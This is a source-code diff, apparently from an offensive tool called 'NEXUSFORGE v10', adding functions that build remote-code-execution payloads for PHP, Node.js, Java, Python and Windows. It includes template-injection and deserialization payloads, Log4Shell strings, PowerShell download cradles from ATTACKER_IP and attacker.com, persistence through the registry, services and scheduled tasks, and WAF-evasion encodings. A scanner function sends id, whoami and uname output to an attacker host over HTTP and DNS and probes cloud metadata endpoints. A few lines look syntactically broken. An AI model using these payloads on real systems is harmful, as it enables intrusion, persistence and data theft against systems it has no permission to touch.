@@ -2609,3 +2609,472 @@ export function buildSsrfEscalationPayloads(): string[] {
     "http://spoofed.burpcollaborator.net/",
   ];
 }
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   NEXUSFORGE v10 — EXTENDED ENGINE ADDITIONS
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+/* ── PHP-specific RCE chains ──────────────────────────────────────────────── */
+export function buildPhpRceChains(cmd: string): string[] {
+  const B64 = b64(cmd);
+  return [
+    /* Direct exec functions */
+    `<?php system(${JSON.stringify(cmd)}); ?>`,
+    `<?php passthru(${JSON.stringify(cmd)}); ?>`,
+    `<?php exec(${JSON.stringify(cmd)}, $o); echo implode("\\n", $o); ?>`,
+    `<?php shell_exec(${JSON.stringify(cmd)}); ?>`,
+    `<?php echo \`${cmd}\`; ?>`,
+    `<?php proc_open(${JSON.stringify(cmd)}, [['pipe','r'],['pipe','w'],['pipe','w']], $p); echo stream_get_contents($p[1]); ?>`,
+    `<?php $f=popen(${JSON.stringify(cmd)}, 'r'); echo fread($f, 4096); ?>`,
+    /* Obfuscated via variable functions */
+    `<?php $a='sys'.'tem'; $a(${JSON.stringify(cmd)}); ?>`,
+    `<?php $a=base64_decode('${B64}'); system($a); ?>`,
+    `<?php $f='assert'; $f(base64_decode('${b64(`system("${cmd}")`)}')): ?>`,
+    `<?php eval('?>' . base64_decode('${b64(`<?php system("${cmd}"); ?>`)}')); ?>`,
+    `<?php $a=str_rot13('flfgrz'); $a(${JSON.stringify(cmd)}); ?>`,
+    /* Disable functions bypass via FFI */
+    `<?php $ffi=FFI::cdef("int system(const char *cmd);","libc.so.6"); $ffi->system(${JSON.stringify(cmd)}); ?>`,
+    /* preg_replace /e (PHP < 7) */
+    `<?php preg_replace('/.*/e', 'system(${JSON.stringify(cmd)})', ''); ?>`,
+    /* call_user_func */
+    `<?php call_user_func('system', ${JSON.stringify(cmd)}); ?>`,
+    `<?php call_user_func_array('system', [${JSON.stringify(cmd)}]); ?>`,
+    /* array_map */
+    `<?php array_map('system', [${JSON.stringify(cmd)}]); ?>`,
+    /* usort */
+    `<?php usort([${JSON.stringify(cmd)}], function($a,$b){system($a);}); ?>`,
+    /* SSTI in Smarty/Twig/Blade */
+    `{php}system(${JSON.stringify(cmd)});{/php}`,
+    `{{${JSON.stringify(cmd)}|exec}}`,
+    `{{ ["sh","-c",${JSON.stringify(cmd)}]|join('')|exec }}`,
+    `{%- set ns = namespace(result='') -%}{%- set ns.result = [${JSON.stringify(cmd)}]|map('system') -%}`,
+    /* PHP object injection gadget stub */
+    `O:8:"stdClass":1:{s:4:"data";s:${cmd.length}:"${cmd}";}`,
+    /* Log poisoning: inject into user-agent for inclusion */
+    `<?php system(${JSON.stringify(cmd)}); ?> <!--log-poison-->`,
+  ];
+}
+
+/* ── Node.js / JavaScript RCE chains ────────────────────────────────────── */
+export function buildNodeRceChains(cmd: string): string[] {
+  const B64 = b64(cmd);
+  return [
+    /* require('child_process') */
+    `require('child_process').execSync(${JSON.stringify(cmd)},{stdio:'inherit'})`,
+    `require('child_process').exec(${JSON.stringify(cmd)},(_,o)=>console.log(o))`,
+    `require('child_process').spawnSync('sh',['-c',${JSON.stringify(cmd)}],{stdio:'inherit'})`,
+    /* eval/Function chains */
+    `eval(require('child_process').execSync(${JSON.stringify(`echo ${B64}|base64 -d`)}).toString())`,
+    `(new Function('require','return require(\'child_process\').execSync('+JSON.stringify(cmd)+').toString()'))(require)`,
+    /* process.binding */
+    `process.binding('spawn_sync').spawn({file:'sh',args:['sh','-c',${JSON.stringify(cmd)}],envPairs:process.env,stdio:[{type:'pipe'},{type:'pipe'},{type:'pipe'}]})`,
+    /* vm module escape */
+    `require('vm').runInNewContext('this.constructor.constructor("return process")()',{}).mainModule.require('child_process').execSync(${JSON.stringify(cmd)}).toString()`,
+    /* SSJI (Server-Side JS Injection) payloads */
+    `{{constructor.constructor("return global.process.mainModule.require('child_process').execSync('${cmd}').toString()")()}}`,
+    `";require('child_process').execSync('${cmd}');//`,
+    `'+require('child_process').execSync('${cmd}').toString()+'`,
+    /* Prototype pollution chain */
+    `{"__proto__":{"shell":"sh","NODE_OPTIONS":"--require /proc/self/fd/99"}}`,
+    /* require.cache poisoning */
+    `Object.keys(require.cache)[0];require('child_process').execSync(${JSON.stringify(cmd)})`,
+    /* Buffer overflow chain */
+    `Buffer.from(require('child_process').execSync(${JSON.stringify(cmd)}).toString()).toString('base64')`,
+    /* Nested function constructor */
+    `(function(){return this})().constructor.constructor('return process')().mainModule.require('child_process').execSync(${JSON.stringify(cmd)}).toString()`,
+    /* Express router injection */
+    `res.end(require('child_process').execSync(${JSON.stringify(cmd)}).toString())`,
+    /* Lodash/template injection */
+    `_.template('<%= global.process.mainModule.require("child_process").execSync("${cmd}").toString() %>')()`,
+    /* Handlebars SSTI */
+    `{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').execSync('${cmd}').toString()"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}`,
+  ];
+}
+
+/* ── Java/Spring/Groovy RCE chains ──────────────────────────────────────── */
+export function buildJavaRceChains(cmd: string): string[] {
+  const B64 = b64(cmd);
+  return [
+    /* SpEL (Spring Expression Language) */
+    `T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","${cmd}"})`,
+    `#{T(java.lang.Runtime).getRuntime().exec("${cmd}")}`,
+    `${'{'}T(java.lang.Runtime).getRuntime().exec("${cmd}")${'}'}`,
+    `${'{'}T(java.lang.ProcessBuilder).new(["/bin/sh","-c","${cmd}"]).start()${'}'}`,
+    /* Groovy (Grails, Jenkins, etc.) */
+    `"${cmd}".execute().text`,
+    `["sh","-c","${cmd}"].execute().text`,
+    `${'${'}["sh","-c","${cmd}"].execute().text${'}'}`,
+    `def p=["sh","-c","${cmd}"].execute();p.waitFor();p.text`,
+    /* OGNL (Struts 2) */
+    `%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/sh","-c","${cmd}"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}`,
+    /* EL (Expression Language) */
+    `${'$'}{Runtime.getRuntime().exec("${cmd}")}`,
+    `${'$'}{pageContext.request.getSession().setAttribute("x",Runtime.getRuntime().exec("${cmd}"))}`,
+    /* FreeMarker */
+    `<#assign ex="freemarker.template.utility.Execute"?new()>${'$'}{ex("${cmd}")}`,
+    /* Velocity */
+    `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getMethod('exec',$str.class).invoke($rt.getMethod('getRuntime').invoke(null),'${cmd}'))`,
+    /* Thymeleaf */
+    `__${'$'}{T(java.lang.Runtime).getRuntime().exec("${cmd}")}__::.x`,
+    `${'$'}{#rt = @java.lang.Runtime@getRuntime(),#rt.exec("${cmd}")}`,
+    /* Java deserialization gadget marker */
+    `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcGkVpWGGmJVVAwABRgAKbG9hZEZhY3RvcnhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTL4R0LqBJIGQAwAHSQAIaGFzaENvZGVJAAhwb3J0TnVtSQAIcHJvdG9jb2xJAARyZWZJAARob3N0SQAEcGF0aHQADHN0cmluZ0luZm94cg==`,
+    /* Log4Shell (CVE-2021-44228) */
+    `${'$'}{jndi:ldap://127.0.0.1:1389/${cmd}}`,
+    `${'$'}{jndi:ldap://127.0.0.1:1389/a}`,
+    `${'${'}${'{'}lower:j}${'${'}lower:n}di:ldap://127.0.0.1:1389/a}`,
+    `${'${'}${'{'}${'{'}lower:j}}${'$'}{${'{'}lower:n}}di:${'$'}{${'{'}lower:l}}dap://127.0.0.1:1389/a}`,
+  ];
+}
+
+/* ── Python RCE chains ───────────────────────────────────────────────────── */
+export function buildPythonRceChains(cmd: string): string[] {
+  const B64 = b64(cmd);
+  return [
+    /* Direct exec */
+    `__import__('os').system('${cmd}')`,
+    `__import__('os').popen('${cmd}').read()`,
+    `__import__('subprocess').check_output(['sh','-c','${cmd}']).decode()`,
+    `__import__('subprocess').run(['sh','-c','${cmd}'],capture_output=True,text=True).stdout`,
+    /* eval chains */
+    `eval(__import__('base64').b64decode('${B64}').decode())`,
+    `eval(compile(__import__('base64').b64decode('${B64}'),'<str>','exec'))`,
+    `exec(__import__('base64').b64decode('${B64}'))`,
+    /* Jinja2 SSTI */
+    `{{ config.__class__.__init__.__globals__['os'].popen('${cmd}').read() }}`,
+    `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('${cmd}').read() }}`,
+    `{{ namespace.__init__.__globals__.os.popen('${cmd}').read() }}`,
+    `{{ ''.__class__.__mro__[1].__subclasses__()[394]('${cmd}',shell=True,stdout=-1).communicate()[0].decode() }}`,
+    `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('${cmd}').read()}}{% endif %}{% endfor %}`,
+    /* Tornado/Mako SSTI */
+    `${'$'}{__import__('os').popen('${cmd}').read()}`,
+    `<%import os%>${'$'}{os.popen('${cmd}').read()}`,
+    /* Pickle deserialization */
+    `cposix\nsystem\n(S'${cmd}'\ntR.`,
+    /* ctypes */
+    `__import__('ctypes').CDLL(None).system('${cmd}')`,
+    /* importlib */
+    `__import__('importlib').import_module('os').system('${cmd}')`,
+    /* builtins */
+    `__builtins__['__import__']('os').system('${cmd}')`,
+    /* Flask debug PIN bypass chain */
+    `{{ request.application.__globals__.__builtins__.__import__('os').popen('${cmd}').read() }}`,
+    `{{ config.items().__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`,
+    /* Python2 compat */
+    `execfile('/tmp/.nx.py') if __import__('os').system('echo "import os;os.system(chr(${cmd.split('').map(c=>c.charCodeAt(0)).join(',')})" > /tmp/.nx.py') == 0 else None`,
+  ];
+}
+
+/* ── Extended Windows RCE chains ─────────────────────────────────────────── */
+export function buildWindowsRceChains(cmd: string): string[] {
+  const B64w = Buffer.from(cmd, 'utf16le').toString('base64');
+  const B64u = b64(cmd);
+  return [
+    /* PowerShell */
+    `powershell -NonI -W Hidden -Exec Bypass -c "${cmd}"`,
+    `powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${B64w}`,
+    `powershell -NonI -W Hidden -Exec Bypass -c "IEX [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${B64w}'))"`,
+    `powershell -NonI -W Hidden -Exec Bypass -c "$x=[System.Convert]::FromBase64String('${B64u}');IEX([System.Text.Encoding]::UTF8.GetString($x))"`,
+    /* cmd.exe */
+    `cmd /c ${cmd}`,
+    `cmd /q /c ${cmd}`,
+    `cmd /v:on /c ${cmd}`,
+    /* WMIC */
+    `wmic process call create "${cmd}"`,
+    `wmic os get /format:"http://attacker.com/shell.xsl"`,
+    /* MSBuild inline task */
+    `msbuild /nologo /noconsolelogger /verbosity:quiet`,
+    /* certutil */
+    `certutil -decode base64payload.b64 payload.exe && payload.exe`,
+    /* Regsvr32 Squiblydoo */
+    `regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll`,
+    /* RunDLL32 */
+    `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"${cmd}\\\",0,true);");`,
+    /* MSHTA */
+    `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""${cmd}"",0:close")`,
+    /* wscript/cscript */
+    `wscript //E:jscript //B -e:${B64u}`,
+    `cscript //E:jscript //B -e:${B64u}`,
+    /* PowerShell download cradles */
+    `powershell -NonI -W Hidden -Exec Bypass -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/sh.ps1')|IEX"`,
+    `powershell -NonI -W Hidden -Exec Bypass -c "iex(iwr -useb 'http://ATTACKER_IP/sh.ps1')"`,
+    /* Windows scheduled task */
+    `schtasks /create /sc once /st 00:00 /tn nx /tr "${cmd}" /f && schtasks /run /tn nx`,
+    /* Service creation */
+    `sc create NXSvc binPath= "${cmd}" && sc start NXSvc`,
+    /* Registry exec */
+    `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NX /t REG_SZ /d "${cmd}" /f`,
+    /* AppLocker bypass via Installutil */
+    `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PAYLOAD.dll`,
+    /* Mavinject */
+    `mavinject PID /INJECTRUNNING PAYLOAD.dll`,
+    /* Living off the land: forfiles */
+    `forfiles /p c:\\windows\\system32 /m notepad.exe /c "${cmd}"`,
+    /* find */
+    `for /f "delims=" %i in ('dir /b %WINDIR%\\system32\\*.exe') do @echo %i`,
+    /* Batch obfuscation */
+    `c^m^d /c ${[...cmd].map(c=>`^${c}`).join('')}`,
+    /* Environment variable concat */
+    `SET NX=${cmd.slice(0,5)}&& SET NX=%NX%${cmd.slice(5)}&& %NX%`,
+  ];
+}
+
+/* ── Massive WAF bypass payload builder ──────────────────────────────────── */
+export function buildMassiveBypass(cmd: string): string[] {
+  const B64 = b64(cmd);
+  const HEX = hexEsc(cmd);
+  const raw  = cmd;
+  const v    = `_v${Math.floor(Math.random()*99999)}`;
+  return [
+    /* Null byte / comment injection */
+    `${raw}%00`,
+    `${raw}/**/`,
+    `${raw}#comment`,
+    `${raw}\r\n`,
+    /* Alternate whitespace */
+    raw.replace(/ /g, "\t"),
+    raw.replace(/ /g, "\u0009"),
+    raw.replace(/ /g, "\u000b"),
+    raw.replace(/ /g, "\u000c"),
+    raw.replace(/ /g, "\u0085"),
+    raw.replace(/ /g, "\u00a0"),
+    raw.replace(/ /g, "${IFS}"),
+    raw.replace(/ /g, "$IFS"),
+    /* Brace expansion */
+    `{${raw.replace(/ /g, ",")}`,
+    /* Wildcard abuse */
+    raw.replace(/\b(cat|bash|sh|id|ls|curl|wget|python3|perl|ruby|nc)\b/g, m => {
+      const half = Math.floor(m.length / 2);
+      return m.slice(0, half) + '*' + m.slice(half);
+    }),
+    /* Glob + path expansion */
+    raw.replace(/\b(cat|bash|sh)\b/g, m => `/???/b?n/${m}`),
+    `/???/b??/b??h -c '${raw}'`,
+    `/???/b??/sh -c '${raw}'`,
+    `/usr/bin/env bash -c '${raw}'`,
+    /* printf + eval */
+    `eval$(printf '${HEX}')`,
+    `eval "$(printf '%b' '${HEX}')"`,
+    `printf '%b' '${HEX}' | bash`,
+    /* base64 decode */
+    `bash<<<$(echo${"\t"}${B64}|base64${"\t"}-d)`,
+    `bash<<<$({echo,${B64}}|{base64,-d})`,
+    `{echo,${B64}}|{base64,-d}|bash`,
+    `echo ${B64}|base64 -d|sh`,
+    /* xxd decode */
+    `echo ${Buffer.from(cmd).toString('hex')}|xxd -r -p|bash`,
+    /* Variable concatenation */
+    `${v}=${JSON.stringify(cmd.slice(0,3))};${v}2=${JSON.stringify(cmd.slice(3))};eval "$${v}$${v}2"`,
+    /* Char code expansion */
+    `$(for c in ${[...Buffer.from(cmd)].map(b=>(b as number)).join(' ')};do printf "\\$(printf '%03o' $c)";done|bash)`,
+    /* Arithmetic expansion bypass */
+    `$((0)) ${raw}`,
+    `((1)) && ${raw}`,
+    /* Command substitution nesting */
+    `$($(echo ${raw}))`,
+    `\`\`echo ${B64}|base64 -d\`\``,
+    /* ANSI C quoting */
+    `$'${[...Buffer.from(raw)].map(b=>`\\x${(b as number).toString(16).padStart(2,'0')}`).join('')}'`,
+    /* Process substitution */
+    `source <(echo ${B64}|base64 -d)`,
+    `bash <(echo ${B64}|base64 -d)`,
+    /* Encoding layering */
+    `bash<<<$(echo ${b64(B64)}|base64 -d|base64 -d)`,
+    `bash<<<$(echo ${b64(b64(B64))}|base64 -d|base64 -d|base64 -d)`,
+    /* Reverse + decode */
+    `echo ${Buffer.from(cmd).reverse().toString('base64')}|base64 -d|rev|bash`,
+    /* Unicode normalization attack */
+    raw.replace(/[a-z]/g, c => `\\u00${c.charCodeAt(0).toString(16)}`),
+    /* HTTP param pollution with bypass */
+    `${raw}&${raw}`,
+    `${raw}%26${raw}`,
+    /* Case permutation */
+    [...raw].map((c,i)=>i%2?c.toUpperCase():c).join(''),
+    /* Semicolon bypass */
+    `;${raw};`,
+    `|${raw}`,
+    `||${raw}`,
+    `&&${raw}`,
+    /* Pipe bypass */
+    `echo x|${raw}`,
+    `true|${raw}`,
+    /* Multiline */
+    `${raw}\\\ncontinued`,
+  ];
+}
+
+/* ── Build "direct injection" payloads (injection-param-ready) ──────────── */
+export function buildDirectInjectionPayloads(cmd: string): string[] {
+  const B64 = b64(cmd);
+  const HEX = hexEsc(cmd);
+  return [
+    /* Classic injection separators */
+    `; ${cmd}`,
+    `| ${cmd}`,
+    `|| ${cmd}`,
+    `&& ${cmd}`,
+    `& ${cmd}`,
+    `\`${cmd}\``,
+    `$(${cmd})`,
+    /* Newline injection (for multi-arg parsers) */
+    `%0a${cmd}`,
+    `%0a%0d${cmd}`,
+    `\n${cmd}`,
+    /* Null byte injection */
+    `%00${cmd}`,
+    `\x00${cmd}`,
+    /* Shell meta-character injection */
+    `';${cmd};'`,
+    `";${cmd};"`,
+    `');${cmd};//`,
+    `");${cmd};//`,
+    /* JSON injection */
+    `","type":"$shell","cmd":"${cmd}","x":"`,
+    /* XML injection */
+    `</tag><![CDATA[;${cmd}]]><tag>`,
+    /* template injection payloads */
+    `{{${cmd}}}`,
+    `${'{'}${'{'}${cmd}${'}'${'}'}}`,
+    `\${${cmd}}`,
+    `#{${cmd}}`,
+    `<%=${cmd}%>`,
+    /* IFS bypass */
+    `;${cmd.replace(/ /g,'${IFS}')}`,
+    `|${cmd.replace(/ /g,'${IFS}')}`,
+    /* b64 decode injection */
+    `;{echo,${B64}}|{base64,-d}|{bash,}`,
+    `|{echo,${B64}}|{base64,-d}|{bash,}`,
+    `$(bash<<<$(echo${"\t"}${B64}|base64${"\t"}-d))`,
+    /* printf decode injection */
+    `;eval$(printf '${HEX}')`,
+    `|eval$(printf '${HEX}')`,
+    /* Windows injection */
+    `&${cmd}&`,
+    `|${cmd}|`,
+    `\r\n${cmd}`,
+    /* HTTP header injection */
+    `\r\nX-Injected: ${cmd}`,
+    /* LDAP injection */
+    `)(${cmd})(`,
+    /* XPath injection */
+    `' or '1'='1`;
+    /* SSTI generic */
+    `${'{'}7*7${'}'}`  ,
+    `{{7*7}}`,
+    `<%= 7*7 %>`,
+    `#{7*7}`,
+  ].filter((v,i,a)=>a.indexOf(v)===i); // deduplicate
+}
+
+/* ── Adaptive payloads (context-aware) - MASSIVELY EXPANDED ─────────────── */
+export function buildAdaptivePayloads(cmd: string, tools: string[]): string[] {
+  const B64 = b64(cmd);
+  const has  = (t: string) => tools.includes(t);
+  const out: string[] = [];
+
+  /* Always include base variants */
+  out.push(`{ ${cmd}; } 2>&1`);
+  out.push(`( ${cmd} ) 2>&1`);
+  out.push(`eval ${JSON.stringify(cmd)}`);
+  out.push(`bash -c ${JSON.stringify(cmd)}`);
+  out.push(`sh -c ${JSON.stringify(cmd)}`);
+
+  if (has("bash") || has("sh")) {
+    out.push(`{echo,${B64}}|{base64,-d}|{bash,}`);
+    out.push(`bash<<<$(echo ${B64}|base64 -d)`);
+    out.push(`bash -c "$(printf '${hexEsc(cmd)}')" 2>/dev/null`);
+    out.push(`exec 3<>/dev/tcp/127.0.0.1/0; ${cmd} >&3`);
+  }
+  if (has("python3") || has("python")) {
+    out.push(`python3 -c "import os;os.system(${JSON.stringify(cmd)})" 2>/dev/null`);
+    out.push(`python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())" 2>/dev/null`);
+    out.push(`python3 -c "import subprocess;print(subprocess.check_output(['sh','-c',${JSON.stringify(cmd)}]).decode())" 2>/dev/null`);
+  }
+  if (has("perl")) {
+    out.push(`perl -e "system(${JSON.stringify(cmd)})" 2>/dev/null`);
+    out.push(`perl -MMIME::Base64 -e "system(decode_base64('${B64}'))" 2>/dev/null`);
+  }
+  if (has("ruby")) {
+    out.push(`ruby -e "system(${JSON.stringify(cmd)})" 2>/dev/null`);
+    out.push(`ruby -e "require 'base64';system(Base64.decode64('${B64}'))" 2>/dev/null`);
+  }
+  if (has("node")) {
+    out.push(`node -e "require('child_process').execSync(${JSON.stringify(cmd)},{stdio:'inherit'})" 2>/dev/null`);
+    out.push(`node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})" 2>/dev/null`);
+  }
+  if (has("curl")) {
+    out.push(`curl -sk "http://127.0.0.1/$(${cmd})" 2>/dev/null`);
+    out.push(`curl -sk -d "$(${cmd})" "http://127.0.0.1/" 2>/dev/null`);
+  }
+  if (has("nc") || has("ncat")) {
+    out.push(`echo "${cmd}" | nc -q1 127.0.0.1 9999 2>/dev/null`);
+  }
+  if (has("php")) {
+    out.push(`php -r "system(${JSON.stringify(cmd)});" 2>/dev/null`);
+    out.push(`php -r "passthru(${JSON.stringify(cmd)});" 2>/dev/null`);
+  }
+  if (has("awk")) {
+    out.push(`awk 'BEGIN{system(${JSON.stringify(cmd)})}' /dev/null 2>/dev/null`);
+  }
+  if (has("sed")) {
+    out.push(`sed -n 'e ${cmd}' /dev/null 2>/dev/null`);
+  }
+  if (has("find")) {
+    out.push(`find /tmp -maxdepth 0 -exec ${cmd.split(' ')[0]} ${cmd.split(' ').slice(1).join(' ')} \\; 2>/dev/null`);
+  }
+  if (has("xargs")) {
+    out.push(`echo ${JSON.stringify(cmd)} | xargs -I% bash -c "%" 2>/dev/null`);
+  }
+  if (has("tee")) {
+    out.push(`echo ${JSON.stringify(cmd)} | tee /dev/stderr | bash 2>/dev/null`);
+  }
+  if (has("dd")) {
+    out.push(`dd if=/dev/stdin of=/tmp/.nx bs=1 count=${cmd.length} <<< ${JSON.stringify(cmd)} && bash /tmp/.nx 2>/dev/null`);
+  }
+  if (has("openssl")) {
+    out.push(`echo ${B64}|openssl enc -d -base64|bash 2>/dev/null`);
+  }
+  if (has("base64")) {
+    out.push(`echo ${B64}|base64 -d|bash 2>/dev/null`);
+    out.push(`echo ${b64(B64)}|base64 -d|base64 -d|bash 2>/dev/null`);
+  }
+  if (has("xxd")) {
+    out.push(`echo ${Buffer.from(cmd).toString('hex')}|xxd -r -p|bash 2>/dev/null`);
+  }
+
+  return out;
+}
+
+/* ── Injection-ready self-contained RCE scanner ─────────────────────────── */
+export function buildScanningPayloads(attackerIp: string, attackerPort: string): string[] {
+  return [
+    /* DNS callback (canary) */
+    `nslookup $(hostname).canary.${attackerIp} 2>/dev/null`,
+    `dig +short $(hostname).nx.${attackerIp} 2>/dev/null`,
+    `curl -sk "http://${attackerIp}:${attackerPort}/c/$(hostname)/$(whoami)" 2>/dev/null`,
+    `wget -qO- "http://${attackerIp}:${attackerPort}/c/$(hostname)/$(id|base64 -w0)" 2>/dev/null`,
+    /* Time-based blind */
+    `sleep 7`,
+    `ping -c 7 127.0.0.1 >/dev/null 2>&1`,
+    `python3 -c "import time;time.sleep(7)" 2>/dev/null`,
+    `perl -e "sleep 7" 2>/dev/null`,
+    `node -e "setTimeout(()=>{},7e3)" 2>/dev/null`,
+    `ruby -e "sleep 7" 2>/dev/null`,
+    /* Verify RCE */
+    `id;whoami;hostname;uname -a`,
+    `id && curl -sk "http://${attackerIp}:${attackerPort}/rce/$(id|base64 -w0)" 2>/dev/null`,
+    `whoami && wget -qO- "http://${attackerIp}:${attackerPort}/rce/$(whoami)" 2>/dev/null`,
+    /* Network connectivity check */
+    `curl -sk -m3 "http://${attackerIp}:${attackerPort}/" 2>/dev/null && echo CONNECTED`,
+    `ping -c1 ${attackerIp} 2>/dev/null && echo REACHABLE`,
+    /* Output to HTTP */
+    `curl -sk "http://${attackerIp}:${attackerPort}/x?q=$(id 2>&1|base64 -w0)" 2>/dev/null`,
+    `wget -qO- "http://${attackerIp}:${attackerPort}/x?q=$(uname -a 2>&1|base64 -w0)" 2>/dev/null`,
+    /* DNS exfil channel */
+    `for w in $(id|tr ' ' '\n'|head -5); do dig +short "$w.nx.${attackerIp}" 2>/dev/null; done`,
+    /* SSRF probe */
+    `curl -sk "http://169.254.169.254/latest/meta-data/" 2>/dev/null && echo AWS_IMDS`,
+    `curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null && echo GCP_IMDS`,
+    `curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null && echo AZURE_IMDS`,
+  ];
+}
